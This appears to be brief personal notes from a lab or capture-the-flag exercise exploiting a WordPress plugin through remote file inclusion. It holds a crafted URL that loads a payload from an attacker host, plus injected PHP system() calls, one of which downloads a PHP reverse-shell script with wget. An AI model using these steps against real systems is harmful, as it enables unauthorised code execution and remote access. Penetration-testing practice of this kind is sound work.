




https://www.exploit-db.com/exploits/46794


https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618






http://192.168.151.123/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.49.151:8000/payload.txt





Tried this:
<pre>system('ls -la /home/takis/')</pre>

Tried to spawn a reverse shell with bash but that didn't work 




<pre>system('wget http://192.168.49.151:8000/Documents/Tools/php-reverse-shell.php')</pre>



